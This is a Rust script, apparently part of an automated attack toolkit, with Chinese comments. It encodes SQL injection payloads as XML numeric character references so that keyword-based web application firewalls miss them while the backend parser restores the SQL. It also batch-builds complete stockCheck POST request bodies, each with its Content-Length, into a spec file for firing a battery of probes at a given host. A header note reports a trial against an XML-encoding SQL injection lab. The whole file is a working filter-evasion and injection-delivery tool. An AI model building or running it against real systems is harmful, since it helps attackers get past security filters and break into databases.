#!/usr/bin/env rust-script
//! name: xml_enc
//! description: XML 数字实体编码件 - 把一段载荷(或整个 stock-check 形式的 XML 请求体)逐字符转成数字字符引用(十进制 &#NN;,可选 --hex),用于绕过只按原始字节匹配关键词的 WAF:过滤器看不到明文关键词,后端的 XML 解析器再把它还原成明文 SQL。--matrix 批量模式把 N 条 --payload 各自编码并拼成完整的 stockCheck 请求体,算出逐变体 Content-Length,直接落一份 raw_matrix 规格文件,一次投递整张探针电池(IO 仍归 raw_matrix)。
//! version: 1.1.0
//! args: <text> [--field productId] [--store 1] [--hex] [--body] | --matrix FILE --host HOST --payload 'SQL'... [--path /product/stock] [--field F] [--store S] [--hex] [--snippet N] [--selftest]
//! keywords: xml, entity, numeric-character-reference, encode, waf, filter, bypass, sql, injection, matrix
//!
//! 实测(kimi, lab xml-encoding sql injection):十进制实体过过滤器且被 XML 解析器正常还原;同一位置的十六进制实体(&#xNN;)被后端判为 XML parsing error,故默认走十进制。

use pi_rust_lib::serde_json::{json, Value};

fn encode(text: &str, hex: bool) -> String {
    let mut out = String::new();
    for ch in text.chars() {
        if hex {
            out.push_str(&format!("&#x{:x};", ch as u32));
        } else {
            out.push_str(&format!("&#{};", ch as u32));
        }
    }
    out
}

fn stock_body(field: &str, store: &str, encoded: &str) -> String {
    format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><stockCheck><{field}>{encoded}</{field}><storeId>{store}</storeId></stockCheck>"
    )
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let dec = encode("A1", false);
        let hx = encode("A1", true);
        let body = stock_body("productId", "1", &dec);
        let ok = dec == "&#65;&#49;"
            && hx == "&#x41;&#x31;"
            && body.contains("&#65;&#49;")
            && body.starts_with("<?xml");
        pi_rust_lib::report::success(
            "xml_enc",
            json!({"selftest": if ok {"ok"} else {"fail"}, "decimal": dec, "hex": hx, "body_len": body.len()}),
            "selftest checks decimal/hex encoding and body assembly",
        )
        .unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }

    let mut text: Option<String> = None;
    let mut field = String::from("productId");
    let mut store = String::from("1");
    let mut path = String::from("/product/stock");
    let mut host: Option<String> = None;
    let mut matrix: Option<String> = None;
    let mut snippet: u64 = 120;
    let mut hex = false;
    let mut body = false;
    let mut payloads: Vec<String> = Vec::new();
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--hex" => hex = true,
            "--body" => body = true,
            "--field" => {
                i += 1;
                if i < args.len() {
                    field = args[i].clone();
                }
            }
            "--store" => {
                i += 1;
                if i < args.len() {
                    store = args[i].clone();
                }
            }
            "--path" => {
                i += 1;
                if i < args.len() {
                    path = args[i].clone();
                }
            }
            "--host" => {
                i += 1;
                if i < args.len() {
                    host = Some(args[i].clone());
                }
            }
            "--matrix" => {
                i += 1;
                if i < args.len() {
                    matrix = Some(args[i].clone());
                }
            }
            "--snippet" => {
                i += 1;
                if let Some(v) = args.get(i).and_then(|s| s.parse::<u64>().ok()) {
                    snippet = v;
                }
            }
            "--payload" => {
                i += 1;
                if i < args.len() {
                    payloads.push(args[i].clone());
                }
            }
            other if !other.starts_with("--") && text.is_none() && !payloads.is_empty() => {
                payloads.push(other.to_string());
            }
            other if !other.starts_with("--") && text.is_none() => text = Some(other.to_string()),
            _ => {}
        }
        i += 1;
    }

    if let Some(out) = matrix {
        let Some(host) = host else {
            pi_rust_lib::report::failure(
                "xml_enc",
                "missing --host",
                "matrix mode needs --host <instance hostname> to build the raw_matrix spec",
            );
            std::process::exit(2);
        };
        if payloads.is_empty() {
            pi_rust_lib::report::failure(
                "xml_enc",
                "missing --payload",
                "give one or more --payload 'SQL fragment' values to expand",
            );
            std::process::exit(2);
        }
        let mut variants: Vec<Value> = Vec::new();
        let mut entries: Vec<Value> = Vec::new();
        for (idx, p) in payloads.iter().enumerate() {
            let encoded = encode(p, hex);
            let b = stock_body(&field, &store, &encoded);
            variants.push(json!({
                "name": format!("p{idx}:{p}"),
                "line": format!("POST {path} HTTP/1.1"),
                "headers": ["Content-Type: application/xml", format!("Content-Length: {}", b.len())],
                "body": b,
            }));
            entries.push(json!({"i": idx, "payload": p, "encoded": encoded, "body_len": b.len()}));
        }
        let spec = json!({
            "host": host,
            "port": 443,
            "tls": true,
            "snippet": snippet,
            "variants": variants,
        });
        let text = pi_rust_lib::serde_json::to_string_pretty(&spec).unwrap_or_default();
        if let Err(e) = std::fs::write(&out, text) {
            pi_rust_lib::report::failure("xml_enc", &format!("write {out}: {e}"), "pick a writable --matrix path");
            std::process::exit(2);
        }
        let next = format!("run: raw_matrix @{out}");
        pi_rust_lib::report::success(
            "xml_enc",
            json!({"matrix": out, "host": host, "path": path, "variants": entries.len(), "entries": entries}),
            &next,
        )
        .unwrap_or(());
        return;
    }

    let Some(text) = text else {
        pi_rust_lib::report::failure(
            "xml_enc",
            "missing text",
            "call as: xml_enc '<payload>' [--body] [--hex] or xml_enc --matrix FILE --host H --payload 'SQL'",
        );
        std::process::exit(2);
    };

    let encoded = encode(&text, hex);
    let mut data = json!({
        "input": text,
        "encoded": encoded,
        "encoded_len": encoded.chars().count(),
        "mode": if hex { "hex" } else { "decimal" },
    });
    if body {
        let b = stock_body(&field, &store, &encoded);
        data["body_len"] = json!(b.len());
        data["body"] = json!(b);
    }
    pi_rust_lib::report::success(
        "xml_enc",
        data,
        "feed data.body straight into http_session post --body (the HTTP piece sets Content-Length)",
    )
    .unwrap_or(());
}
